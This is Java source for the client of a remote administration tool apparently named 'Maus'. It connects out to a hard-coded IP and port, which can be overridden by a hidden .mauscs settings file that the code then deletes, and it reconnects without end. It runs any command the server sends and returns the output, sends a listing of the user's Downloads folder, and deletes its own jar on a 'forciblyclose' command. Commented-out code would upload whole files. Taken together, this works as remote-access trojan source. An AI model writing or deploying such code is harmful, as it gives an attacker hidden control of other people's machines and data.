package Client;

import java.io.*;
import java.net.Socket;
import java.util.ArrayList;

public class Client {
    private static String HOST = "141.219.247.21";
    private static int PORT = 22122;
    private BufferedOutputStream out;
    private Socket socket;


    private static String getHOST() {
        return HOST;
    }

    private static void setHOST(String HOST) {
        Client.HOST = HOST;
    }

    private static int getPORT() {
        return PORT;
    }

    private static void setPORT(int PORT) {
        Client.PORT = PORT;
    }

    public static void main(String[] args) throws Exception {
        /* Load server settings and then attempt to connect to Maus. */
        Client client = new Client();
        client.loadServerSettings();
        client.connect();
    }

    private static String getMauscs() throws Exception {
        String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getParentFile().getPath().replace('\\', '/');
        try (InputStream stream = Client.class.getResourceAsStream("/Client/.mauscs");
             OutputStream resStreamOut = new FileOutputStream(jarFolder + "/.mauscs")) {
            int readBytes;
            byte[] buffer = new byte[4096];
            while ((readBytes = stream.read(buffer)) > 0) {
                resStreamOut.write(buffer, 0, readBytes);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        return jarFolder + "/.mauscs";
    }

    private void connect() throws InterruptedException {
        try {
            socket = new Socket(getHOST(), getPORT());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new BufferedOutputStream(socket.getOutputStream());
            System.out.println("Client started: " + getHOST() + ":" + getPORT());
            String comm;
            while ((comm = in.readLine()) != null) {
                comm = in.readLine();
                if (comm.contains("CMD ")) {
                    System.out.println(comm);
                    exec(comm.replace("CMD ", ""));
                }
                if (comm.contains("FILELIST")) {
                    communicate("FILELIST");
                    sendFileList();
                }
                if (comm.equals("forciblyclose")) {
                    communicate("forciblyclose");
                    File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
                    f.delete();
                    System.exit(0);
                }
            }
        } catch (IOException e) {
            /* Continually retry connection until established. */
            System.out.println("Disconnected... retrying.");
            Thread.sleep(1200);
            connect();
        }
    }

    /* Sends a message to the Server. */
    private void communicate(String msg) throws IOException {
        Writer writer = new OutputStreamWriter(out);
        writer.write(msg);
        writer.flush();
    }

    /* Execute a command using Java's Runtime. */
    private void exec(String command) throws IOException, InterruptedException {
        if (!command.equals("")) {

            try {
                ProcessBuilder pb = new ProcessBuilder(command);
                pb.redirectErrorStream(true);
                Process proc = pb.start();
                BufferedReader in =
                        new BufferedReader(new InputStreamReader(proc.getInputStream()));
                String line;
                communicate("CMD");
                try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
                     DataOutputStream dos = new DataOutputStream(bos)) {
                    ArrayList<String> output = new ArrayList<>();
                    while ((line = in.readLine()) != null) {
                        output.add(line);
                    }
                    proc.waitFor();
                    dos.writeInt(output.size());
                    for (String s : output) {
                        dos.writeUTF(s);
                    }
                    dos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                communicate("END");
                in.close();
            } catch (IOException e) {
                e.printStackTrace();
                exec("");
            }

        }
    }

    /* Loads the .mauscs*/
    private void loadServerSettings() throws Exception {
        String filename = getMauscs();
        Thread.sleep(2000);
        File mauscs = new File(filename);
        try (BufferedReader reader = new BufferedReader(new FileReader(mauscs))
        ) {
            String line;
            StringBuilder stringBuilder = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line);
            }
            String[] settings = stringBuilder.toString().split(" ");
            System.out.println(settings[0]);
            if (settings.length == 2) {
                setHOST(settings[0]);
                setPORT(Integer.parseInt(settings[1]));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        mauscs.delete();
    }

    private void sendFileList() {
        try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
             DataOutputStream dos = new DataOutputStream(bos)) {
            String directory = System.getProperty("user.home") + "/Downloads/";
            File[] files = new File(directory).listFiles();
            dos.writeUTF(directory);
            dos.writeInt(files.length);
            for (File file : files) {
                String name = file.getName();
                dos.writeUTF(name);
            }
            dos.writeUTF("END");
        } catch (IOException e) {
            e.printStackTrace();
        }

//        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
//        DataOutputStream dos = new DataOutputStream(bos);
//
//        dos.writeInt(files.length);
//
//        for(File file : files){
//            Long length = file.length();
//            dos.writeLong(length);
//
//            String name = file.getName();
//            dos.writeUTF(name);
//
//            FileInputStream fis = new FileInputStream(file);
//            BufferedInputStream bis = new BufferedInputStream(fis);
//
//            int fbyte = 0;
//            while((fbyte = bis.read()) != -1) {
//                bos.write(fbyte);
//
//            }
//            bis.close();
//        }
//        dos.close();
    }
}
